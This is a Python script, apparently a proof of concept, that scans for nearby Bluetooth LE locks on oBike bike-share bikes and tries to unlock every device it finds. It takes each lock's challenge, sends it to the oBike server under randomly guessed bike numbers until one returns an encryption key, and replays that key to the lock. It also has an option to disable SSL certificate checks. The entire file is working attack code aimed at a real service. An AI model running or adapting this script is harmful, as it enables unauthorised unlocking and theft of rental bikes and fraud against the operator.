#!/usr/bin/env python
from bluepy.btle import Scanner, DefaultDelegate
from obike.ble_client import BleClient
from obike.ble_scanner import BleScanner
from obike.http_client import HttpClient
from colorama import Fore, Back, Style
import json
import struct
import argparse
import random
import traceback


def unlock_bike(mac, iface=0, verify=False):
    c = BleClient(mac)
    h = HttpClient(verify=verify)
    c.connect()

    # [1] say hello to lock
    res = c.hello()
    if len(res) > 5:
        # if necessary, lock bike first
        ts = struct.unpack('>I', res[10:14])[0]
        print "timestamp: %d" % ts
        c.hello_lock_bike(ts)

    # [2] receive challenge
    challenge = c.push_coords(8.5308422, 47.372763).encode('hex').upper()
    print "Challenge: %s" % challenge

    # [3], [4] get response from obike server
    success = False
    for i in range(0, 10):
        bikeno = "04100" + str(random.randint(1000, 9999))
        print "Taking bikeno: %s" % bikeno
        res = h.unlock_pass(bikeno, challenge)['data']
        print "Response from server: " +  json.dumps(res)
        if 'encryptionKey' in res:
            success = True
            break
    if not success:
        print Fore.MAGENTA + Style.BRIGHT + "Error: could not find a valid bike, aborting." + Style.RESET_ALL

    # [5] send response to lock
    c.send_keys(res['encryptionKey'], res['serverTime']/1000, res['keys'].decode('hex'))

    # [6] TODO get acknowledgement from lock
    # [7] TODO send acknowledgement to obike server

    # kthxbye
    c.disconnect()

parser = argparse.ArgumentParser(prog='scanner.py')
parser.add_argument('-i', '--iface', help='hci interface number', type=int, default=0)
parser.add_argument('-k', '--insecure', help='disable SSL certificate validation', action='store_false')
args = parser.parse_args()
print "iface: ", args.iface

scanner = BleScanner(args.iface)
devices = scanner.scan(10)

for dev in devices:
    print "Device %s (%s), RSSI=%d dB" % (dev.addr, dev.addrType, dev.rssi)
    for (adtype, desc, value) in dev.getScanData():
        print "   %s = %s" % (desc, value)
    print "unlocking in progress... %s" % dev.addr
    try:
        unlock_bike(dev.addr, args.iface, args.insecure)
    except Exception as ex:
        print Fore.MAGENTA + Style.BRIGHT + "Error occured, aborting.\n" + traceback.format_exc() + Style.RESET_ALL
    print "----------------------------\n\n"


